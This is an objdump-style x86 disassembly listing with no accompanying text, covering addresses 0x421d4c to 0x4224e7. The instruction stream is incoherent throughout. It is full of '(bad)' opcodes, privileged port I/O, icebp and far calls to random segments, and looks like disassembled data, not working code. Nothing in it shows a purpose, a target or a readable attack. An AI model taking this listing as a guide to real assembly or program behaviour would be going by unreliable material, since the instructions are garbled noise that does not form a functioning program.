  421d4c:	dec    esp
  421d4d:	dec    edi
  421d4e:	call   0xc139:0x29c239aa
  421d55:	inc    eax
  421d56:	fnstcw WORD PTR [ecx+0x5d4f38c]
  421d5c:	sub    BYTE PTR [ecx-0x68],dh
  421d5f:	xchg   edi,eax
  421d60:	sub    BYTE PTR [ebx-0x2cb2801d],bh
  421d66:	sti    
  421d67:	inc    ebx
  421d68:	and    DWORD PTR [esi+0x571c699d],0x295a9a51
  421d72:	push   ebx
  421d73:	mov    BYTE PTR [eax-0x351c8350],al
  421d79:	push   edi
  421d7a:	jl     0x421db2
  421d7c:	or     ch,BYTE PTR [esi-0x34]
  421d7f:	daa    
  421d80:	pop    edx
  421d81:	icebp  
  421d82:	pushf  
  421d83:	icebp  
  421d84:	push   cs
  421d85:	(bad)  
  421d86:	jecxz  0x421dd3
  421d88:	not    DWORD PTR [ebx+edx*8]
  421d8b:	xchg   BYTE PTR [edx-0x21bd723f],dh
  421d91:	dec    edx
  421d92:	jmp    0x421d8c
  421d94:	xchg   edx,eax
  421d95:	cmp    eax,0xa5ecfdc5
  421d9a:	stos   DWORD PTR es:[edi],eax
  421d9b:	jne    0x421d96
  421d9d:	pop    ds
  421d9e:	or     edi,DWORD PTR [edi]
  421da0:	cdq    
  421da1:	into   
  421da2:	or     cl,bl
  421da4:	leave  
  421da5:	sbb    cl,0xb2
  421da8:	jecxz  0x421d44
  421daa:	lods   eax,DWORD PTR ds:[esi]
  421dab:	out    0x55,al
  421dad:	push   es
  421dae:	cdq    
  421daf:	sbb    eax,0xf97e2fce
  421db4:	fnstcw WORD PTR ds:0xe63b8aed
  421dba:	mov    bh,BYTE PTR [ecx-0x6b]
  421dbd:	inc    ecx
  421dbe:	out    0x9e,eax
  421dc0:	push   ebp
  421dc1:	out    dx,eax
  421dc2:	push   cs
  421dc3:	inc    ecx
  421dc4:	xor    BYTE PTR [edi+0x25],dl
  421dc7:	imul   ebx,DWORD PTR [edx-0x51],0x6a1f793b
  421dce:	cmp    eax,0xcb350a78
  421dd3:	ins    DWORD PTR es:[edi],dx
  421dd4:	repz jnp 0x421d93
  421dd7:	adc    al,0x9e
  421dd9:	mov    ch,0xe2
  421ddb:	bound  eax,QWORD PTR [ecx-0x6e]
  421dde:	jbe    0x421deb
  421de0:	aaa    
  421de1:	fidivr DWORD PTR [edi+0x3681e9f8]
  421de7:	pusha  
  421de8:	cmp    eax,0x26aeaea9
  421ded:	pop    es
  421dee:	pop    esp
  421def:	stc    
  421df0:	pushf  
  421df1:	cmp    BYTE PTR [esi+0x70589c9a],ch
  421df7:	dec    edx
  421df8:	adc    eax,0xbfeb5106
  421dfd:	sar    dl,1
  421dff:	in     al,dx
  421e00:	mov    edx,0x553a8150
  421e05:	inc    esi
  421e06:	mov    ds:0xd1d57f77,eax
  421e0b:	jle    0x421de8
  421e0d:	mov    bl,0x81
  421e0f:	push   eax
  421e10:	jle    0x421e71
  421e12:	jp     0x421e76
  421e14:	mov    ah,0x34
  421e16:	shr    esp,1
  421e18:	gs dec edi
  421e1a:	rol    BYTE PTR ds:0x5cc77d46,1
  421e20:	lea    edi,ds:0x19821249
  421e26:	jns    0x421e89
  421e28:	std    
  421e29:	sub    BYTE PTR [ebp-0x5048611e],al
  421e2f:	mov    bh,0x99
  421e31:	xchg   ecx,eax
  421e32:	push   ecx
  421e33:	fs out 0xfa,eax
  421e36:	jmp    0x9bf2:0xd5556e68
  421e3d:	iret   
  421e3e:	(bad)  
  421e3f:	xchg   edi,eax
  421e40:	js     0x421deb
  421e42:	imul   ecx,eax,0xffffff81
  421e45:	or     BYTE PTR [edi+0x30],al
  421e48:	cmp    eax,0xe2116863
  421e4d:	add    ecx,DWORD PTR [eax+0x7b8bbb58]
  421e53:	push   es
  421e54:	aam    0x16
  421e56:	dec    edi
  421e57:	lods   al,BYTE PTR ds:[esi]
  421e58:	add    eax,0x52db4e8f
  421e5d:	sbb    dl,bl
  421e5f:	fs fs push edx
  421e62:	(bad)  
  421e63:	cmp    edx,DWORD PTR [eax]
  421e65:	lea    ecx,[ebp-0x34091220]
  421e6b:	mov    dh,0xf0
  421e6d:	lock imul ecx,ebp,0x137eb248
  421e74:	push   0x9502d09a
  421e79:	pop    ecx
  421e7a:	push   eax
  421e7b:	sbb    BYTE PTR [esi+ecx*1-0x5acf7658],al
  421e82:	fcmovnbe st,st(5)
  421e84:	in     al,0x8d
  421e86:	mov    eax,ds:0x7b080300
  421e8b:	jp     0x421e2b
  421e8d:	outs   dx,BYTE PTR ds:[esi]
  421e8e:	cmp    esi,DWORD PTR [esi-0x8]
  421e91:	aad    0xd1
  421e93:	mov    BYTE PTR [ebx+0x66],dh
  421e96:	xor    ecx,DWORD PTR [ebx]
  421e98:	add    cl,BYTE PTR [esi-0x67]
  421e9b:	fs out 0xcc,al
  421e9e:	loop   0x421e4d
  421ea0:	(bad)  
  421ea1:	sahf   
  421ea2:	fsub   st,st(7)
  421ea4:	xor    BYTE PTR [ebx+0x72b067ce],0x91
  421eab:	adc    BYTE PTR [edx+0x6b],ah
  421eae:	ins    BYTE PTR es:[edi],dx
  421eaf:	int3   
  421eb0:	sub    DWORD PTR [ebx+0x40e19427],ebp
  421eb6:	call   0x742d4f87
  421ebb:	test   eax,0x4d4290e3
  421ec0:	test   ebp,ebx
  421ec2:	je     0x421f23
  421ec4:	loopne 0x421f1f
  421ec6:	and    eax,DWORD PTR [esi+0x779e9726]
  421ecc:	in     al,dx
  421ecd:	ds leave 
  421ecf:	shr    BYTE PTR [ecx+0x16],cl
  421ed2:	mov    cl,0xd4
  421ed4:	out    dx,eax
  421ed5:	test   eax,0x9dd9e5b1
  421eda:	add    eax,0x774b2045
  421edf:	sub    ecx,DWORD PTR [esi-0x52df34c5]
  421ee5:	into   
  421ee6:	or     DWORD PTR [eax-0x10be5eb9],ecx
  421eec:	xchg   ebp,eax
  421eed:	pop    edx
  421eee:	or     dl,BYTE PTR [ebp-0x41]
  421ef1:	lea    esi,[esi-0x3a]
  421ef4:	test   al,0x7d
  421ef6:	mov    dl,BYTE PTR [edx-0x21]
  421ef9:	xchg   edi,eax
  421efa:	dec    edi
  421efb:	aad    0x7
  421efd:	inc    eax
  421efe:	add    eax,0x4a7d3811
  421f03:	(bad)  
  421f04:	mov    ebp,0xdba486bb
  421f09:	addr16 jge 0x421f6e
  421f0c:	shl    DWORD PTR [ecx+eax*8],cl
  421f0f:	outs   dx,BYTE PTR ds:[esi]
  421f10:	fisttp WORD PTR [esi]
  421f12:	push   edi
  421f13:	mov    cl,0x62
  421f15:	stos   DWORD PTR es:[edi],eax
  421f16:	xor    edi,ebp
  421f18:	sub    dl,BYTE PTR [eax-0x6e]
  421f1b:	dec    esp
  421f1c:	leave  
  421f1d:	in     eax,0x72
  421f1f:	scas   eax,DWORD PTR es:[edi]
  421f20:	in     eax,0x2a
  421f22:	fwait
  421f23:	cmp    BYTE PTR [esi+0xf],dh
  421f26:	pop    esi
  421f27:	add    eax,0xa1517af2
  421f2c:	ins    BYTE PTR es:[edi],dx
  421f2d:	cld    
  421f2e:	push   es
  421f2f:	cld    
  421f30:	mov    edx,0x1cf1af8f
  421f35:	aas    
  421f36:	pop    esi
  421f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f38:	std    
  421f39:	repz push esp
  421f3b:	rol    DWORD PTR [edi],cl
  421f3d:	pop    ds
  421f3e:	jp     0x421f77
  421f40:	sti    
  421f41:	xchg   ecx,eax
  421f42:	and    DWORD PTR [ecx],ecx
  421f44:	inc    eax
  421f45:	inc    esi
  421f46:	popf   
  421f47:	and    bh,al
  421f49:	arpl   bx,bp
  421f4b:	or     bh,bh
  421f4d:	or     ch,BYTE PTR [ebx+ecx*8+0x38]
  421f51:	add    BYTE PTR [esi],0xc1
  421f54:	leave  
  421f55:	out    dx,eax
  421f56:	stos   BYTE PTR es:[edi],al
  421f57:	sbb    al,0x8b
  421f59:	push   esp
  421f5a:	cmp    eax,0x8109978d
  421f5f:	mov    ds:0x5762b9f4,eax
  421f64:	add    BYTE PTR [ecx],cl
  421f66:	adc    esp,DWORD PTR [ebp+ebx*8+0x386333b6]
  421f6d:	xchg   DWORD PTR es:0x3772c060,ecx
  421f74:	dec    bh
  421f76:	and    DWORD PTR [eax-0x58],esi
  421f79:	cs push es
  421f7b:	inc    eax
  421f7c:	dec    esp
  421f7d:	cmp    al,0x29
  421f7f:	ds cld 
  421f81:	or     al,0xeb
  421f83:	mov    cl,0x9f
  421f85:	clc    
  421f86:	rcl    BYTE PTR [edi+eiz*1],1
  421f89:	in     eax,0x48
  421f8b:	je     0x421f58
  421f8d:	push   DWORD PTR [ecx]
  421f8f:	std    
  421f90:	jo     0x421fc0
  421f92:	repz enter 0xd4c4,0xc7
  421f97:	push   eax
  421f98:	ds scas al,BYTE PTR es:[edi]
  421f9a:	dec    esi
  421f9b:	ds lahf 
  421f9d:	dec    ecx
  421f9e:	outs   dx,DWORD PTR es:[esi]
  421fa0:	sahf   
  421fa1:	or     BYTE PTR [ebp+0x21],al
  421fa4:	jo     0x42201f
  421fa6:	xchg   ebp,eax
  421fa7:	addr16 sahf 
  421fa9:	shl    esp,cl
  421fab:	fdiv   DWORD PTR [ebp-0x4e]
  421fae:	arpl   WORD PTR [edx+0x19e70b79],di
  421fb4:	sti    
  421fb5:	xor    esi,DWORD PTR [eax+0x61]
  421fb8:	mov    esi,cs
  421fba:	jg     0x421f89
  421fbc:	xchg   esi,eax
  421fbd:	or     eax,0x91ae13bc
  421fc2:	(bad)  
  421fc3:	fild   WORD PTR cs:[esi]
  421fc6:	ret    0xd859
  421fc9:	dec    esp
  421fca:	sahf   
  421fcb:	xchg   ebp,eax
  421fcc:	mov    ah,0xf
  421fce:	ds mov ah,0xb8
  421fd1:	push   ecx
  421fd2:	das    
  421fd3:	dec    esi
  421fd4:	sbb    esi,esi
  421fd6:	cmp    dl,dl
  421fd8:	retf   0x50aa
  421fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fdc:	loop   0x42201b
  421fde:	fmul   st,st(1)
  421fe0:	dec    ebp
  421fe1:	test   DWORD PTR ds:0xeecd45a8,edi
  421fe7:	dec    eax
  421fe8:	jno    0x421f6d
  421fea:	aas    
  421feb:	xor    al,0x2c
  421fed:	out    dx,eax
  421fee:	push   ss
  421fef:	xor    ecx,DWORD PTR [ecx]
  421ff1:	dec    ebp
  421ff2:	fidiv  DWORD PTR [edx-0x6c]
  421ff5:	dec    ebp
  421ff6:	(bad)  
  421ff7:	aam    0x22
  421ff9:	jle    0x42202d
  421ffb:	pop    esi
  421ffc:	pop    eax
  421ffd:	aad    0x1a
  421fff:	or     al,0x31
  422001:	outs   dx,BYTE PTR ds:[esi]
  422002:	xacquire xchg DWORD PTR ds:0x5653d96b,ebp
  422009:	pop    es
  42200a:	pop    esp
  42200b:	lods   eax,DWORD PTR ds:[esi]
  42200c:	push   cs
  42200d:	mov    ds:0x5defaa7c,al
  422012:	mov    edx,0xb7011fea
  422017:	push   edx
  422018:	push   cs
  422019:	fild   WORD PTR [eax-0x22babd4e]
  42201f:	popf   
  422020:	xchg   DWORD PTR [edi],edx
  422022:	adc    ecx,0x1f
  422025:	add    ecx,DWORD PTR [ebx]
  422027:	dec    ecx
  422028:	push   0xfffffff5
  42202a:	mov    edx,0x176cf5a
  42202f:	scas   al,BYTE PTR es:[edi]
  422030:	or     eax,0x3fbb5df4
  422035:	inc    edx
  422036:	pusha  
  422037:	add    eax,0x275f3549
  42203c:	imul   ecx,DWORD PTR [esi+ecx*2-0x5e],0x2d
  422041:	dec    edi
  422042:	dec    ebx
  422043:	iret   
  422044:	retf   0xf86
  422047:	iret   
  422048:	xchg   ebx,eax
  422049:	mov    es,WORD PTR [ebx+edx*8-0x42c3cf22]
  422050:	push   ss
  422051:	mov    cl,0x1c
  422053:	pop    ebp
  422054:	lock sbb eax,0x24ab693b
  42205a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42205b:	out    dx,al
  42205c:	shl    BYTE PTR [esi-0x6e],cl
  42205f:	iret   
  422060:	mov    al,ds:0xc38b40aa
  422065:	xchg   edx,eax
  422066:	sti    
  422067:	call   0xab5f44ac
  42206c:	mov    bh,0xd0
  42206e:	xor    DWORD PTR [esi+0x697067c8],eax
  422074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422075:	xchg   BYTE PTR [ebp-0x1a],ah
  422078:	repz fsub DWORD PTR [edi]
  42207b:	dec    esi
  42207c:	cmp    al,0x59
  42207e:	jne    0x4220b5
  422080:	xchg   edi,eax
  422081:	lock arpl WORD PTR [ecx-0x2],si
  422085:	add    ah,BYTE PTR [eax]
  422087:	and    bl,al
  422089:	call   0x93a8:0xc285b4c5
  422090:	inc    esi
  422091:	sub    eax,0x543e98c7
  422096:	add    BYTE PTR [ecx+ebp*8-0x78],al
  42209a:	sbb    bl,BYTE PTR [esi+eax*2+0x5d2b1e7e]
  4220a1:	push   ss
  4220a2:	pop    esp
  4220a3:	aas    
  4220a4:	dec    ecx
  4220a5:	pop    esp
  4220a6:	and    BYTE PTR [ebp+0x43a8e75b],bl
  4220ac:	mov    ebx,ebp
  4220ae:	and    al,0x7d
  4220b0:	sbb    DWORD PTR [esi-0x60],ecx
  4220b3:	cmp    esp,DWORD PTR [esi+0x6d]
  4220b6:	das    
  4220b7:	inc    edx
  4220b8:	lods   eax,DWORD PTR ds:[si]
  4220ba:	out    dx,eax
  4220bb:	add    esp,DWORD PTR [ebp+0x0]
  4220be:	(bad)
  4220c2:	mov    es,WORD PTR [ebp+esi*8-0x21]
  4220c6:	xor    BYTE PTR [esi],ch
  4220c8:	mov    ch,0x40
  4220ca:	push   es
  4220cb:	idiv   DWORD PTR [ebx]
  4220cd:	inc    ecx
  4220ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220cf:	push   DWORD PTR [ebp-0x59]
  4220d2:	mov    al,0xcd
  4220d4:	sbb    DWORD PTR [edi+eax*1],0xd0a4a798
  4220db:	xchg   edi,eax
  4220dc:	jb     0x422072
  4220de:	loope  0x4220c0
  4220e0:	mov    dh,0x2d
  4220e2:	and    DWORD PTR [esi+0x7a],ebp
  4220e5:	adc    eax,0xef3b6d6a
  4220ea:	aad    0xe
  4220ec:	dec    ebx
  4220ed:	add    al,0x2a
  4220ef:	xor    al,0xb4
  4220f1:	call   0xa2a2:0x6aee446e
  4220f8:	dec    edx
  4220f9:	jne    0x42213b
  4220fb:	mov    al,0xe0
  4220fd:	(bad)  
  4220fe:	stos   DWORD PTR es:[edi],eax
  4220ff:	push   es
  422100:	xor    eax,0x1c1fbd6d
  422105:	data16 jns 0x4220c9
  422108:	(bad)  
  422109:	call   0xec52bbac
  42210e:	pop    edi
  42210f:	sub    DWORD PTR [ecx],edx
  422111:	inc    ebp
  422112:	int    0x89
  422114:	js     0x42216b
  422116:	xor    BYTE PTR [ecx],ah
  422118:	mov    WORD PTR [eax+0x2],fs
  42211b:	push   es
  42211c:	cli    
  42211d:	mov    DWORD PTR [esp+eax*2-0x3e],esi
  422121:	call   0xf13af28e
  422126:	sbb    DWORD PTR [ebx+0x6377397],ebx
  42212c:	(bad)  
  42212d:	int3   
  42212e:	xor    ah,BYTE PTR [esi-0x69]
  422131:	mov    eax,0xa7d90a88
  422136:	pop    ss
  422137:	ins    DWORD PTR es:[di],dx
  422139:	iret   
  42213a:	add    dl,ah
  42213c:	cmp    DWORD PTR [ebx],ebp
  42213e:	fwait
  42213f:	sbb    ecx,esp
  422141:	sub    DWORD PTR [eax-0x1d04073a],ecx
  422147:	and    eax,0xbeb45dc9
  42214c:	or     DWORD PTR [edi+0xd70f091],edx
  422152:	aad    0x0
  422154:	or     dh,dh
  422156:	loop   0x422192
  422158:	in     eax,0xb0
  42215a:	das    
  42215b:	int3   
  42215c:	push   ss
  42215d:	or     ebx,DWORD PTR [eax+edi*4+0x20]
  422161:	xor    BYTE PTR [esi+0x40],dl
  422164:	inc    eax
  422165:	sbb    BYTE PTR [ebx],al
  422167:	dec    esi
  422168:	int    0x9e
  42216a:	ret    0x14bc
  42216d:	jle    0x42213e
  42216f:	jnp    0x42218a
  422171:	dec    esi
  422172:	data16 je 0x4221c0
  422175:	pushf  
  422176:	lods   al,BYTE PTR ds:[esi]
  422177:	dec    esi
  422178:	retf   
  422179:	sbb    esp,DWORD PTR ds:0xd78482bf
  42217f:	push   ebp
  422180:	mov    WORD PTR [edi],?
  422182:	lods   al,BYTE PTR ds:[esi]
  422183:	or     ebx,DWORD PTR [edi+edi*2-0x36e97ac7]
  42218a:	fnstsw WORD PTR [ebx-0x7b]
  42218d:	leave  
  42218e:	push   ebp
  42218f:	cwde   
  422190:	jl     0x42217d
  422192:	clc    
  422193:	daa    
  422194:	test   BYTE PTR [esi+0x4647cef0],dh
  42219a:	jno    0x422155
  42219c:	ret    0x7561
  42219f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221a0:	xchg   edi,eax
  4221a1:	(bad)  
  4221a2:	cmc    
  4221a3:	inc    esi
  4221a4:	or     eax,0x71074f2e
  4221a9:	int3   
  4221aa:	and    al,0xa3
  4221ac:	test   ah,ah
  4221ae:	jle    0x422220
  4221b0:	lahf   
  4221b1:	push   0xdf96a167
  4221b6:	mov    bl,0x9a
  4221b8:	je     0x4221e4
  4221ba:	pop    esi
  4221bb:	(bad)  
  4221bc:	pop    edx
  4221bd:	push   edx
  4221be:	cmp    DWORD PTR [eax+0x77],esi
  4221c1:	sub    al,0x89
  4221c3:	inc    esi
  4221c4:	js     0x422166
  4221c6:	mov    ds:0xcf0c426c,eax
  4221cb:	out    0x8,al
  4221cd:	cmp    ch,BYTE PTR [edx-0x4bac4184]
  4221d3:	ret    0x96a2
  4221d6:	xchg   esi,eax
  4221d7:	fiadd  WORD PTR [eax]
  4221d9:	and    ah,BYTE PTR [edx+0x6a5b2cad]
  4221df:	mul    DWORD PTR [ebp-0x3f]
  4221e2:	arpl   si,ax
  4221e4:	je     0x4221d8
  4221e6:	call   0x4f2c:0xd4bb5493
  4221ed:	jns    0x4221ce
  4221ef:	or     esi,DWORD PTR [eax-0x3c35dd11]
  4221f5:	adc    ecx,DWORD PTR [eax]
  4221f7:	outs   dx,DWORD PTR ds:[esi]
  4221f8:	mov    ah,BYTE PTR [eax-0x75e49b6b]
  4221fe:	test   eax,0x59bdd366
  422203:	adc    BYTE PTR [ebp+0x3e],ch
  422206:	mov    al,0xc5
  422208:	lahf   
  422209:	pop    esi
  42220a:	icebp  
  42220b:	int    0x3b
  42220d:	xchg   ebp,eax
  42220e:	out    0x78,eax
  422210:	fidiv  WORD PTR [edx]
  422212:	mov    al,ds:0x985107e9
  422217:	imul   BYTE PTR [esi]
  422219:	sub    ecx,DWORD PTR [ecx-0x41]
  42221c:	adc    edx,DWORD PTR [edx-0x22]
  42221f:	sub    BYTE PTR [esi+0x6261795c],bh
  422225:	mov    DWORD PTR [esi+ebx*4-0x766f66f7],esi
  42222c:	das    
  42222d:	xor    dl,BYTE PTR ds:0xafe84336
  422233:	add    DWORD PTR [edx],eax
  422235:	pop    esi
  422236:	sti    
  422237:	dec    ebp
  422238:	mov    esp,0x761df193
  42223d:	inc    ebp
  42223e:	mov    ds:0x9c60fc42,eax
  422243:	stc    
  422244:	push   ss
  422245:	jbe    0x422209
  422247:	cli    
  422248:	test   al,0xe0
  42224a:	jo     0x4222bb
  42224c:	cmp    DWORD PTR [ecx-0x5d87f54c],ecx
  422252:	or     eax,0x7358d2ad
  422257:	dec    edi
  422258:	pop    ebp
  422259:	inc    ecx
  42225a:	sub    al,0xb2
  42225c:	sub    ah,bh
  42225e:	fstp   QWORD PTR [edi+0x97653a4]
  422264:	mov    esi,0x94f331e8
  422269:	sub    al,0x75
  42226b:	dec    eax
  42226c:	cmp    bl,BYTE PTR [ebx]
  42226e:	mov    dh,0xbd
  422270:	ins    DWORD PTR es:[edi],dx
  422271:	sar    BYTE PTR [esi+0x3d],1
  422274:	jne    0x422235
  422276:	scas   eax,DWORD PTR es:[edi]
  422277:	xchg   BYTE PTR [ebx+0x1b],dh
  42227a:	xchg   ecx,eax
  42227b:	pushf  
  42227c:	dec    esi
  42227d:	(bad)  
  42227e:	jmp    DWORD PTR [edi+0x4d1849a2]
  422284:	add    dl,ch
  422286:	jne    0x4222ad
  422288:	lds    esp,FWORD PTR [esi+ebp*1-0x4fbc48f2]
  42228f:	mov    bh,0x79
  422291:	push   edi
  422292:	or     BYTE PTR [esi],cl
  422294:	test   ebp,ebp
  422296:	jmp    0x422265
  422298:	jle    0x4222a0
  42229a:	fwait
  42229b:	das    
  42229c:	mov    dl,0x4d
  42229e:	and    ebx,eax
  4222a0:	mov    edi,DWORD PTR [ebx+edx*1-0x69]
  4222a4:	outs   dx,DWORD PTR ds:[esi]
  4222a5:	dec    esi
  4222a6:	adc    ecx,edx
  4222a8:	sub    eax,0x21bc3981
  4222ad:	sbb    edx,eax
  4222af:	dec    esp
  4222b0:	pushf  
  4222b1:	stos   BYTE PTR es:[edi],al
  4222b2:	sti    
  4222b3:	inc    ebp
  4222b4:	ds pop ebx
  4222b6:	cmp    DWORD PTR [edx-0x3d],ecx
  4222b9:	push   edi
  4222ba:	jmp    0xee7d46ba
  4222bf:	std    
  4222c0:	ins    DWORD PTR es:[edi],dx
  4222c1:	jnp    0x422323
  4222c3:	mov    cl,0x14
  4222c5:	scas   eax,DWORD PTR es:[edi]
  4222c6:	sub    edx,DWORD PTR [edx-0xf]
  4222c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222ca:	pop    ax
  4222cc:	mov    ds:0x4f33d4d0,eax
  4222d1:	xchg   ebp,eax
  4222d2:	fisttp DWORD PTR [edx-0x66fc1ba2]
  4222d8:	cwde   
  4222d9:	mov    ch,0x72
  4222db:	mov    ch,0x55
  4222dd:	mov    eax,ds:0xed7e1c43
  4222e2:	(bad)  
  4222e3:	pop    edx
  4222e4:	sub    ah,BYTE PTR [eax]
  4222e6:	fs xchg ecx,eax
  4222e8:	stc    
  4222e9:	cmp    eax,0xb74355c
  4222ee:	push   0x18
  4222f0:	dec    ebp
  4222f1:	mov    eax,0xc8972691
  4222f6:	xor    BYTE PTR [ebx+0x18],cl
  4222f9:	adc    ebx,esp
  4222fb:	pop    eax
  4222fc:	cmc    
  4222fd:	mov    ds:0x8c6a61e8,eax
  422302:	and    esi,DWORD PTR [ebx]
  422304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422305:	push   ebx
  422306:	(bad)  
  422307:	icebp  
  422308:	in     al,dx
  422309:	mov    cl,0x2a
  42230b:	add    ecx,esp
  42230d:	jecxz  0x4222e8
  42230f:	xchg   al,bl
  422311:	xor    eax,0x444fdef2
  422316:	or     BYTE PTR [edx+0x1f],ch
  422319:	inc    ecx
  42231a:	mov    bh,0x80
  42231c:	leave  
  42231d:	xchg   ebx,eax
  42231e:	xchg   esi,eax
  42231f:	retf   
  422320:	inc    esi
  422321:	call   0x662b11fd
  422326:	push   ss
  422327:	push   esi
  422328:	mov    dh,0x25
  42232a:	fs inc edx
  42232c:	mov    ch,0x1b
  42232e:	adc    DWORD PTR [eax+0x32],ebp
  422331:	loop   0x422364
  422333:	scas   eax,DWORD PTR es:[edi]
  422334:	shl    ah,cl
  422336:	fwait
  422337:	mov    BYTE PTR [esi],dl
  422339:	xor    al,BYTE PTR [esp+ebp*4+0xb]
  42233d:	ret    0x284d
  422340:	rcr    DWORD PTR es:[edx-0x28],cl
  422344:	mov    dh,0xe9
  422346:	or     cl,dh
  422348:	push   edi
  422349:	dec    ebx
  42234a:	mov    esi,0x7a3dfa6d
  42234f:	sub    eax,DWORD PTR [ebx]
  422351:	retf   0xe6a8
  422354:	jecxz  0x4223bb
  422356:	cdq    
  422357:	cmp    al,0x6b
  422359:	and    bl,cl
  42235b:	fcmovb st,st(7)
  42235d:	dec    BYTE PTR [ecx+0x3e]
  422360:	pop    esi
  422361:	test   DWORD PTR [edx+0x54],ebx
  422364:	xchg   edx,eax
  422365:	pop    eax
  422366:	lds    edi,FWORD PTR [edi]
  422368:	lock fs jl 0x4223a1
  42236c:	std    
  42236d:	lock ja 0x4223d4
  422370:	cmc    
  422371:	repnz push ebp
  422373:	out    0x74,eax
  422375:	out    0xd6,al
  422377:	sbb    cl,BYTE PTR ds:0x789b1565
  42237d:	push   ecx
  42237e:	adc    DWORD PTR [ecx],ecx
  422380:	jnp    0x422304
  422382:	jle    0x4223e5
  422384:	mov    ch,0xdc
  422386:	or     al,0x8d
  422388:	jno    0x4223b1
  42238a:	int    0x5d
  42238c:	mov    esi,0x1f82f2
  422391:	xchg   ch,bh
  422393:	sbb    DWORD PTR [edx+0x53f62d8d],esi
  422399:	lods   al,BYTE PTR ds:[esi]
  42239a:	and    DWORD PTR [esi],ebp
  42239c:	dec    edi
  42239d:	inc    ebp
  42239e:	aam    0x18
  4223a0:	(bad)  
  4223a1:	sbb    eax,0x6f9cb553
  4223a6:	pop    ds
  4223a7:	sti    
  4223a8:	push   ds
  4223a9:	rol    ecx,1
  4223ab:	xor    eax,0x2d7c822a
  4223b0:	inc    esi
  4223b1:	and    DWORD PTR [ebp-0x4b],ebp
  4223b4:	inc    edx
  4223b5:	mov    dh,bh
  4223b7:	xchg   ecx,eax
  4223b8:	inc    esp
  4223b9:	inc    ebx
  4223ba:	pushf  
  4223bb:	retf   
  4223bc:	pushf  
  4223bd:	shr    DWORD PTR [esi-0x4fe83090],1
  4223c3:	ret    0xac2d
  4223c6:	(bad)  
  4223c7:	jno    0x422425
  4223c9:	xchg   esp,eax
  4223ca:	xchg   ebx,eax
  4223cb:	imul   esp,DWORD PTR [edx+0x5cc7cb80],0xffffff88
  4223d2:	(bad)
  4223d5:	fmul   st,st(4)
  4223d7:	pop    es
  4223d8:	pop    esi
  4223d9:	sbb    ecx,DWORD PTR [ebx+0x77]
  4223dc:	arpl   WORD PTR [esp+ecx*8-0x3f],bp
  4223e0:	sub    esp,edx
  4223e2:	pop    edx
  4223e3:	push   cs
  4223e4:	in     eax,dx
  4223e5:	sub    BYTE PTR [ebx-0x25],dh
  4223e8:	dec    ebx
  4223e9:	adc    ah,BYTE PTR [edx+ebx*2+0x3d]
  4223ed:	rcl    bl,cl
  4223ef:	cmp    ah,BYTE PTR [esi+ebp*8+0x224d2650]
  4223f6:	xchg   edx,eax
  4223f7:	sub    ah,BYTE PTR ds:0x52932c51
  4223fd:	pop    ebx
  4223fe:	and    ebx,DWORD PTR [edi]
  422400:	jmp    0x1a3892cf
  422405:	je     0x422467
  422407:	repz (bad) 
  422409:	gs pop es
  42240b:	inc    edi
  42240c:	retf   
  42240d:	mov    dh,0x35
  42240f:	in     eax,dx
  422410:	push   es
  422411:	add    ah,BYTE PTR [edi]
  422413:	xchg   ebp,eax
  422414:	nop
  422415:	or     ecx,esi
  422417:	div    BYTE PTR [edx]
  422419:	adc    BYTE PTR [eax],dh
  42241b:	jo     0x42246f
  42241d:	sbb    eax,0xb5698e45
  422422:	imul   ecx,DWORD PTR [bx+si+0x77],0x2b63ecb1
  42242a:	ror    BYTE PTR [esp+eax*8-0x6b],1
  42242e:	mov    esi,0xd141d715
  422433:	mov    ecx,0x77b84cb8
  422438:	adc    al,BYTE PTR [ebp+0x5ff6aa7b]
  42243e:	xor    DWORD PTR [esi+0x74],ebp
  422441:	xchg   ebp,eax
  422442:	out    dx,al
  422443:	gs mov edi,0x7769442f
  422449:	mov    ch,0x7a
  42244b:	loope  0x422455
  42244d:	mov    edx,0x51fc619a
  422452:	push   0x3d0f154d
  422457:	or     edx,DWORD PTR [esi-0x66]
  42245a:	hlt    
  42245b:	test   eax,0xd24f392e
  422460:	adc    ch,cl
  422462:	repz and BYTE PTR [edx-0x67e2a4c8],dh
  422469:	xchg   ecx,eax
  42246a:	xchg   ebp,eax
  42246b:	jne    0x42243b
  42246d:	out    0xdf,al
  42246f:	jge    0x4224ba
  422471:	pop    eax
  422472:	jecxz  0x4224c3
  422474:	repnz cmp DWORD PTR [esp+ebp*1-0x51],ebx
  422479:	jne    0x4224aa
  42247b:	out    0xb7,eax
  42247d:	mov    ds:0x959f0ef0,al
  422482:	jae    0xca2733eb
  422488:	loope  0x4224c5
  42248a:	scas   eax,DWORD PTR es:[edi]
  42248b:	xchg   ebp,eax
  42248c:	push   esp
  42248d:	test   eax,0x39491523
  422492:	xchg   esi,eax
  422493:	or     BYTE PTR [ebp+0xa206cda],0xb5
  42249a:	push   ds
  42249b:	mov    ch,0x2
  42249d:	(bad)  
  42249e:	in     eax,dx
  42249f:	clc    
  4224a0:	dec    esi
  4224a1:	(bad)  
  4224a2:	lock jle 0x422507
  4224a5:	mov    bl,0xd5
  4224a7:	(bad)  
  4224a8:	neg    DWORD PTR [ebp-0x29]
  4224ab:	imul   ebx,DWORD PTR [edi+0x70],0xffffff9d
  4224af:	pusha  
  4224b0:	test   DWORD PTR ds:0x29db7de0,esi
  4224b6:	repz dec ecx
  4224b8:	mov    bl,0x4b
  4224ba:	(bad)  
  4224bb:	out    dx,eax
  4224bc:	sub    eax,DWORD PTR [eax-0x46]
  4224bf:	jmp    0xa581611e
  4224c4:	inc    edx
  4224c5:	ss xor eax,0x7ddec3ff
  4224cb:	pop    eax
  4224cc:	add    dl,bl
  4224ce:	push   eax
  4224cf:	rol    DWORD PTR ds:0xb84025db,0x59
  4224d6:	cld    
  4224d7:	in     al,0xbd
  4224d9:	ret    0xa4d2
  4224dc:	scas   eax,DWORD PTR es:[edi]
  4224dd:	clc    
  4224de:	vmwrite ecx,DWORD PTR [eax]
  4224e1:	sub    cl,bl
  4224e3:	movq   mm5,mm0
  4224e6:	push   ds
  4224e7:	fs mov edx,ds
